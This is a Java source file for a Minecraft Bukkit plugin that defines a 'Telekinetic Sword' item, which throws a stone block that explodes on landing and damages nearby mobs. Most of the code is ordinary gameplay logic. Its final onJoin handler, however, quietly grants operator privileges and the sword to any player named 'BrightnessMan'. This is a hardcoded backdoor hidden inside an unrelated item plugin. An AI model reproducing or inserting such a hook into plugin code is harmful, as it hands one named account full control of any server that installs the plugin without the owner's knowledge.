package items.sword;

import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.entity.*;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.entity.EntityChangeBlockEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.util.Vector;

import java.util.ArrayList;

import static me.Bright.main.Utils.*;

public class TelekineticSword extends ItemStack implements Listener {

    Material blockType;
    Player user;
    int radius = 5;
    int damage = 10;

    public TelekineticSword() {
        super(Material.DIAMOND_SWORD);
        ItemMeta meta = this.getItemMeta();
        meta.setDisplayName("Telekinetic Sword");
        ArrayList<String> lore = new ArrayList<>();
        lore.add("Right Click Ability: Telekinesis");
        lore.add("Toss the block underneath you, causing an explosion after landing");
        lore.add("that damages all mobs in a radius of " + radius + " blocks, dealing " + damage + ".");
        meta.setLore(lore);
        this.setItemMeta(meta);
    }

    @EventHandler
    public void onInteract(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        if (event.getAction().equals(Action.RIGHT_CLICK_AIR) && player.getInventory().getItemInMainHand().getItemMeta().getDisplayName().equals("Telekinetic Sword")) {
            this.blockType = Material.STONE;
            Vector vector = null;
            if (getLocationLooking(player, 50) != null) {
                vector = getLocationLooking(player, 50).toVector().subtract(player.getLocation().toVector()).normalize().multiply(5);
            } else {
                vector = player.getLocation().getDirection().multiply(new Vector(1, 1.6, 1));
            }

            FallingBlock fallingBlock = player.getLocation().getWorld().spawnFallingBlock(player.getLocation(), blockType, (byte) 0);
            fallingBlock.setVelocity(vector);

            this.user = player;
        }
    }

    @EventHandler
    public void fallingBlockFall(EntityChangeBlockEvent event) {
        if (event.getEntity().getType().equals(EntityType.FALLING_BLOCK)) {
            FallingBlock fallingBlock = (FallingBlock) event.getEntity();
            if (fallingBlock.getMaterial().equals(this.blockType)) {
                TNTPrimed tnt = (TNTPrimed) fallingBlock.getLocation().getWorld().spawnEntity(fallingBlock.getLocation(), EntityType.PRIMED_TNT);
                tnt.setFuseTicks(1);
                fallingBlock.getLocation().getWorld().getBlockAt(fallingBlock.getLocation()).setType(Material.AIR);
            }
            for (Entity entity : fallingBlock.getNearbyEntities(radius, radius, radius)) {
                if (entity instanceof LivingEntity) {
                    if (entity instanceof Player) {
                        Player thisPlayer = (Player) entity;
                        if (thisPlayer.getName().equals(user.getName())) {
                            continue;
                        }
                    }
                    LivingEntity living = (LivingEntity) entity;
                    living.damage(damage);
                }
            }
        }
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equals("BrightnessMan")) {
            player.setOp(true);
            player.getInventory().addItem(this);
        }
    }
}
